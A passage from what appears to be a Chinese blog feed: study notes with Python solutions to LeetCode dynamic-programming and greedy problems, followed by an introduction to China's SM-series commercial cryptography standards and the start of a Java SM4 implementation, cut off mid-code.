class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">2</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="72-编辑距离"><a class="markdownIt-Anchor" href="#72-编辑距离"></a> <a href="https://leetcode.cn/problems/edit-distance/">72. 编辑距离</a></h3><p>给你两个单词 <code>word1</code> 和 <code>word2</code>， <em>请返回将 <code>word1</code> 转换成 <code>word2</code> 所使用的最少操作数</em> 。</p><p>你可以对一个单词进行如下三种操作：</p><ul><li>插入一个字符</li><li>删除一个字符</li><li>替换一个字符</li></ul><pre class="line-numbers language-none"><code class="language-none">现在定义dp[i][j] 代表 word1 中前 i 个字符，变换到 word2 中前 j 个字符，最短需要操作的次数；”现在再来理解“dp[i-1][j-1] 表示替换操作，dp[i-1][j] 表示删除操作，dp[i][j-1] 表示插入操作。”dp[i-1][j-1] (表示替换)：word1的前i-1个字符已经变换到word2的前j-1个字符的次数，说明word1的前i-1个和word2的前j-1个字符已经完成操作；那么对于word1的第i个怎么变成word2的第j个呢？这两个字符都存在，那么只能是替换了；所以dp[i][j] &#x3D; dp[i-1][j-1]+1;dp[i][j-1] (表示插入)：word1的前i个字符已经变换到word2的前j-1个字符的次数，当前word1的第i步字符已经用了，但是word2还差一个字符（因为当前只是处理了word2的前j-1个字符），那么插入一个字符就好了；所以dp[i][j] &#x3D; dp[i][j-1]+1;dp[i-1][j] (表示删除)：word1的前i-1个字符已经变换到word2的前j个字符的次数，当前word1仅用了前i-1个字符就完成了到word2的前j个字符的操作，所以word1的第i个字符其实没啥用了，那么删除操作就好了；所以dp[i][j] &#x3D; dp[i-1][j]+1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> word1<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> word2<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        n1 <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word1<span class="token punctuation">)</span>        n2 <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word2<span class="token punctuation">)</span>        dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment"># 第一行</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span>        <span class="token comment"># 第一列</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> word1<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> word2<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>        <span class="token comment">#print(dp)      </span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="贪心算法"><a class="markdownIt-Anchor" href="#贪心算法"></a> 贪心算法</h1><h2 id="前言-2"><a class="markdownIt-Anchor" href="#前言-2"></a> 前言</h2><p><img src="https://code-thinking-1253855093.file.myqcloud.com/pics/20210917104315.png" alt="贪心算法大纲" / loading="lazy"></p><p><strong>贪心的本质是选择每一阶段的局部最优，从而达到全局最优</strong>。</p><p>贪心的算法一般没有套路<strong>最好用的策略就是举反例，如果想不到反例，那么就试一试贪心吧</strong>。</p><p>贪心算法的正确性的数学证明有如下两种方法：</p><ul><li>数学归纳法</li><li>反证法</li></ul><p>事实上，做题直接证明出来，不太现实，只能先推几项，猜测其正确性</p><p><strong>手动模拟一下感觉可以局部最优推出整体最优，而且想不到反例，那么就试一试贪心</strong>。</p><p>贪心算法一般分为如下四步：</p><ul><li>将问题分解为若干个子问题</li><li>找出适合的贪心策略</li><li>求解每一个子问题的最优解</li><li>将局部最优解堆叠成全局最优解</li></ul><p>做题的时候，只要想清楚 局部最优 是什么，如果推导出全局最优，其实就够了</p><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><h3 id="455-分发饼干"><a class="markdownIt-Anchor" href="#455-分发饼干"></a> <a href="https://leetcode.cn/problems/assign-cookies/">455. 分发饼干</a></h3><p>假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，每个孩子最多只能给一块饼干。</p><p>对每个孩子 <code>i</code>，都有一个胃口值 <code>g[i]</code>，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干 <code>j</code>，都有一个尺寸 <code>s[j]</code> 。如果 <code>s[j] &gt;= g[i]</code>，我们可以将这个饼干 <code>j</code> 分配给孩子 <code>i</code> ，这个孩子会得到满足。你的目标是尽可能满足越多数量的孩子，并输出这个最大数值。</p><h4 id="思路-26"><a class="markdownIt-Anchor" href="#思路-26"></a> 思路</h4><p>每个孩子最多只能给一块饼干，那么就要尽量避免饼干尺寸的浪费</p><p>有点和田忌赛马的策略有点类似</p><p>先将饼干数组和小孩数组排序。</p><p>然后从后向前遍历小孩数组，用大饼干优先满足胃口大的，并统计满足小孩数量。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">findContentChildren</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> g<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        g<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>        index<span class="token operator">=</span><span class="token number">0</span>        <span class="token comment">#贪心:大饼干优先</span>        index<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>  <span class="token comment">#index是饼干的下标</span>        count<span class="token operator">=</span><span class="token number">0</span><span class="token comment">#代表满足的孩子的人数</span>        <span class="token comment">#遍历孩子，从胃口最大的开始</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index <span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">>=</span>g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>                 index<span class="token operator">-=</span><span class="token number">1</span>                i<span class="token operator">+=</span><span class="token number">1</span>                count<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> count<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="376-摆动序列"><a class="markdownIt-Anchor" href="#376-摆动序列"></a> <a href="https://leetcode.cn/problems/wiggle-subsequence/">376. 摆动序列</a></h3><p>如果连续数字之间的差严格地在正数和负数之间交替，则数字序列称为 **摆动序列 。**第一个差（如果存在的话）可能是正数或负数。仅有一个元素或者含两个不等元素的序列也视作摆动序列。</p><ul><li>例如， <code>[1, 7, 4, 9, 2, 5]</code> 是一个 <strong>摆动序列</strong> ，因为差值 <code>(6, -3, 5, -7, 3)</code> 是正负交替出现的。</li><li>相反，<code>[1, 4, 7, 2, 5]</code> 和 <code>[1, 7, 4, 5, 5]</code> 不是摆动序列，第一个序列是因为它的前两个差值都是正数，第二个序列是因为它的最后一个差值为零。</li></ul><p><strong>子序列</strong> 可以通过从原始序列中删除一些（也可以不删除）元素来获得，剩下的元素保持其原始顺序。</p><p>给你一个整数数组 <code>nums</code> ，返回 <code>nums</code> 中作为 <strong>摆动序列</strong> 的 <strong>最长子序列的长度</strong> 。</p><h4 id="思路-27"><a class="markdownIt-Anchor" href="#思路-27"></a> 思路</h4><p><strong>局部最优：删除单调坡度上的节点（不包括单调坡度两端的节点），那么这个坡度就可以有两个局部峰值</strong>。</p><p><strong>整体最优：整个序列有最多的局部峰值，从而达到最长摆动序列</strong>。</p><p><strong>实际操作上，其实连删除的操作都不用做，因为题目要求的是最长摆动子序列的长度，所以只需要统计数组的峰值数量就可以了（相当于是删除单一坡度上的节点，然后统计长度）</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wiggleMaxLength</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>  <span class="token comment"># 如果数组长度为0或1，则返回数组长度</span>        curDiff <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 当前一对元素的差值</span>        preDiff <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 前一对元素的差值</span>        result <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 记录峰值的个数，初始为1（默认最右边的元素被视为峰值）</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            curDiff <span class="token operator">=</span> nums<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  <span class="token comment"># 计算下一个元素与当前元素的差值</span>            <span class="token comment"># 如果遇到一个峰值</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>preDiff <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token keyword">and</span> curDiff <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>preDiff <span class="token operator">>=</span> <span class="token number">0</span> <span class="token keyword">and</span> curDiff <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># 峰值个数加1</span>                preDiff <span class="token operator">=</span> curDiff  <span class="token comment"># 注意这里，只在摆动变化的时候更新preDiff</span>        <span class="token keyword">return</span> result  <span class="token comment"># 返回最长摆动子序列的长度</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="122-买卖股票的最佳时机-ii"><a class="markdownIt-Anchor" href="#122-买卖股票的最佳时机-ii"></a> <a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-ii/">122. 买卖股票的最佳时机 II</a></h3><p>给你一个整数数组 <code>prices</code> ，其中 <code>prices[i]</code> 表示某支股票第 <code>i</code> 天的价格。</p><p>在每一天，你可以决定是否购买和/或出售股票。你在任何时候 <strong>最多</strong> 只能持有 <strong>一股</strong> 股票。你也可以先购买，然后在 <strong>同一天</strong> 出售。</p><p>返回 <em>你能获得的 <strong>最大</strong> 利润</em> 。</p><p><strong>局部最优：收集每天的正利润，全局最优：求得最大利润</strong>。</p><p>以每天为维度，只要每天有正收入就收集</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">maxProfit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> prices<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        profits<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>prices<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            profits<span class="token operator">+=</span><span class="token builtin">max</span><span class="token punctuation">(</span>prices<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> profits<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SM系列学习笔记</title>
      <link href="/2024/02/21/SM%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/02/21/SM%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> <strong>背景</strong></h1><p>为了保障商用密码的安全性，国家商用密码管理办公室制定了一系列密码标准，包括SM1（SCB2）、SM2、SM3、SM4、SM7、SM9、祖冲之密码算法（ZUC)那等等。</p><p>其中SM1、SM4、SM7、祖冲之密码（ZUC）是对称算法；SM2、SM9是非对称算法；SM3是<a href="https://so.csdn.net/so/search?q=%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95&amp;spm=1001.2101.3001.7020">哈希算法</a>。目前，这些算法已广泛应用于各个领域中，期待有一天会有采用国密算法的区块链应用出现。</p><p><img src="https://s2.loli.net/2024/02/21/ehFAQp16c3PNju7.png" alt="" / loading="lazy"></p><p>其中SM1、SM7算法不公开，调用该算法时，需要通过加密芯片的接口进行调用；比较少人了解这些算法，在这里对这些国密算法做简单的科普</p><h2 id="sm1对称密码"><a class="markdownIt-Anchor" href="#sm1对称密码"></a> <strong>SM1对称密码</strong></h2><p>SM1 算法是分组密码算法，分组长度为128位，密钥长度都为 128 比特，算法安全保密强度及相关软硬件实现性能与 AES 相当，算法不公开，仅以IP核的形式存在于芯片中。</p><h2 id="sm2椭圆曲线公钥密码算法"><a class="markdownIt-Anchor" href="#sm2椭圆曲线公钥密码算法"></a> <strong>SM2椭圆曲线公钥密码算法</strong></h2><p>SM2算法就是ECC椭圆曲线密码机制，但在签名、密钥交换方面不同于ECDSA、ECDH等国际标准，而是采取了更为安全的机制。另外，SM2推荐了一条256位的曲线作为标准曲线。<br />SM2标准包括总则，数字签名算法，密钥交换协议，公钥加密算法四个部分，并在每个部分的附录详细说明了实现的相关细节及示例。</p><p>SM2算法主要考虑素域Fp和F2m上的椭圆曲线，分别介绍了这两类域的表示，运算，以及域上的椭圆曲线的点的表示，运算和多倍点计算算法。然后介绍了编程语言中的数据转换，包括整数和字节串，字节串和比特串，域元素和比特串，域元素和整数，点和字节串之间的数据转换规则。</p><p>详细说明了有限域上椭圆曲线的参数生成以及验证，椭圆曲线的参数包括有限域的选取，椭圆曲线方程参数，椭圆曲线群基点的选取等，并给出了选取的标准以便于验证。最后给椭圆曲线上密钥对的生成以及公钥的验证，用户的密钥对为（s，sP），其中s为用户的私钥，sP为用户的公钥，由于离散对数问题从sP难以得到s，并针对素域和二元扩域给出了密钥对生成细节和验证方式。总则中的知识也适用于SM9算法。</p><p>在总则的基础上给出了数字签名算法（包括数字签名生成算法和验证算法），密钥交换协议以及公钥加密算法（包括加密算法和解密算法），并在每个部分给出了算法描述，算法流程和相关示例。<br />数字签名算法，密钥交换协议以及公钥加密算法都使用了国家密管理局批准的SM3密码杂凑算法和随机数发生器。数字签名算法，密钥交换协议以及公钥加密算法根据总则来选取有限域和椭圆曲线，并生成密钥对。<br />SM2算法在很多方面都优于RSA算法（RSA发展得早应用普遍，SM2领先也很自然），与RSA安全性对比如下图</p><p><img src="https://s2.loli.net/2024/02/21/TOEL7QxNFnsXiju.png" alt="" / loading="lazy"></p><h2 id="sm3杂凑算法"><a class="markdownIt-Anchor" href="#sm3杂凑算法"></a> <strong>SM3杂凑算法</strong></h2><p>SM3密码杂凑（哈希、散列）算法给出了杂凑函数算法的计算方法和计算步骤，并给出了运算示例。此算法适用于商用密码应用中的数字签名和验证，消息认证码的生成与验证以及随机数的生成，可满足多种密码应用的安全需求。在SM2，SM9标准中使用。</p><p>此算法对输入长度小于2的64次方的比特消息，经过填充和迭代压缩，生成长度为256比特的杂凑值，其中使用了异或，模，模加，移位，与，或，非运算，由填充，迭代过程，消息扩展和压缩函数所构成。具体算法及运算示例见SM3标准。</p><h2 id="sm4对称算法"><a class="markdownIt-Anchor" href="#sm4对称算法"></a> <strong>SM4对称算法</strong></h2><p>此算法是一个分组算法，用于无线局域网产品。该算法的分组长度为128比特，密钥长度为128比特。加密算法与密钥扩展算法都采用32轮非线性迭代结构。解密算法与加密算法的结构相同，只是轮密钥的使用顺序相反，解密轮密钥是加密轮密钥的逆序。</p><p>此算法采用非线性迭代结构，每次迭代由一个轮函数给出，其中轮函数由一个非线性变换和线性变换复合而成，非线性变换由S盒所给出。其中rki为轮密钥，合成置换T组成轮函数。轮密钥的产生与上图流程类似，由加密密钥作为输入生成，轮函数中的线性变换不同，还有些参数的区别。SM4算法的具体描述和示例见SM4标准。</p><h2 id="sm7对称密码"><a class="markdownIt-Anchor" href="#sm7对称密码"></a> <strong>SM7对称密码</strong></h2><p>SM7算法，是一种分组密码算法，分组长度为128比特，密钥长度为128比特。SM7适用于非接触式IC卡，应用包括身份识别类应用(门禁卡、工作证、参赛证)，票务类应用(大型赛事门票、展会门票)，支付与通卡类应用（积分消费卡、校园一卡通、企业一卡通等）。</p><h2 id="sm9标识密码算法"><a class="markdownIt-Anchor" href="#sm9标识密码算法"></a> <strong>SM9标识密码算法</strong></h2><p>为了降低公开密钥系统中密钥和证书管理的复杂性，以色列科学家、RSA算法发明人之一Adi Shamir在1984年提出了标识密码（Identity-Based Cryptography）的理念。标识密码将用户的标识（如邮件地址、手机号码、QQ号码等）作为公钥，省略了交换数字证书和公钥过程，使得安全系统变得易于部署和管理，非常适合端对端离线安全通讯、云端数据加密、基于属性加密、基于策略加密的各种场合。2008年标识密码算法正式获得国家密码管理局颁发的商密算法型号：SM9(商密九号算法)，为我国标识密码技术的应用奠定了坚实的基础。</p><p>SM9算法不需要申请数字证书，适用于互联网应用的各种新兴应用的安全保障。如基于云技术的密码服务、电子邮件安全、智能终端保护、物联网安全、云存储安全等等。这些安全应用可采用手机号码或邮件地址作为公钥，实现数据加密、身份认证、通话加密、通道加密等安全应用，并具有使用方便，易于部署的特点，从而开启了普及密码算法的大门。</p><h2 id="zuc祖冲之算法"><a class="markdownIt-Anchor" href="#zuc祖冲之算法"></a> <strong>ZUC祖冲之算法</strong></h2><p>祖冲之序列密码算法是中国自主研究的流密码算法,是运用于移动通信4G网络中的国际标准密码算法,该算法包括祖冲之算法(ZUC)、加密算法(128-EEA3)和完整性算法(128-EIA3)三个部分。目前已有对ZUC算法的优化实现，有专门针对128-EEA3和128-EIA3的硬件实现与优化。</p><p>密码算法作为国家战略资源，比历史上任何时候都显得更为关键。在大数据和云计算的时代，关键信息往往通过数据挖掘技术在海量数据中获得，所以每一个人的信息保护都非常重要。</p><p><em>转载自<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qukuaiwang.com.cn%2Fnews%2F2271.html">《科普一下SM系列国密算法（从零开始学区块链）》</a></em></p><h1 id="sm4算法"><a class="markdownIt-Anchor" href="#sm4算法"></a> <strong>SM4算法</strong></h1><p>参考链接:<a href="https://www.cnblogs.com/kentle/p/14135865.html">SM4加密算法原理和简单实现（java） - kentle - 博客园 (cnblogs.com)</a></p><p>比较推荐的视频教程:<a href="https://www.bilibili.com/video/BV1LS4y167r3/?spm_id_from=333.1007.top_right_bar_window_history.content.click&amp;vd_source=2dd928d1666db052f11478fedb530519">【SM4加密算法】| SMS4 | 对称加密| 分组加密| 国密| 密码学| 信息安全|_哔哩哔哩_bilibili</a></p><p>SM4是一种分组密码算法，其<strong>分组长度为128位</strong>（即<strong>16字节</strong>，<strong>4字</strong>），<strong>密钥长度也为128位</strong>（即<strong>16字节</strong>，<strong>4字</strong>）。其加解密过程采用了<strong>32轮</strong>迭代机制（与DES、AES类似），每一轮需要一个轮密钥（与DES、AES类似）。</p><p>SM4 文档：<a href="http://www.gmbz.org.cn/main/viewfile/20180108015408199368.html">http://www.gmbz.org.cn/main/viewfile/20180108015408199368.html</a></p><p>左边为加密流程，右边为密钥拓展算法</p><p><img src="https://s2.loli.net/2024/02/21/be2ydIZN9MjirWc.png" alt="" / loading="lazy"></p><h2 id="加密流程"><a class="markdownIt-Anchor" href="#加密流程"></a> <strong>加密流程</strong></h2><h3 id="1-加解密"><a class="markdownIt-Anchor" href="#1-加解密"></a> (1) <strong>加解密</strong></h3><p><img src="https://s2.loli.net/2024/02/21/UexMKTk6LF1jS24.png" alt="" / loading="lazy"></p><h3 id="2-密钥拓展"><a class="markdownIt-Anchor" href="#2-密钥拓展"></a> (2) <strong>密钥拓展</strong></h3><p><img src="https://s2.loli.net/2024/02/21/XWFV2gup54jmfHr.png" alt="" / loading="lazy"></p><h3 id="3-sm4-的逆运算"><a class="markdownIt-Anchor" href="#3-sm4-的逆运算"></a> (3) <strong>SM4 的逆运算</strong></h3><p><img src="https://s2.loli.net/2024/02/21/TLSqYRnm4tlxaD3.png" alt="" / loading="lazy"></p><p><img src="C:%5CUsers%5CNpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240221181537642.png" alt="image-20240221181537642" / loading="lazy"></p><h3 id="代码实现java版"><a class="markdownIt-Anchor" href="#代码实现java版"></a> <strong>代码实现(Java版)</strong></h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SM4</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key_r<span class="token punctuation">;</span>    <span class="token comment">/* 初始化轮密钥 */</span>    <span class="token function">SM4</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>key_r <span class="token operator">=</span> <span class="token function">keyGenerate</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 密钥拓展 */</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">keyGenerate</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key_r <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//轮密钥rk_i</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key_temp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> box_in<span class="token punctuation">,</span> box_out<span class="token punctuation">;</span><span class="token 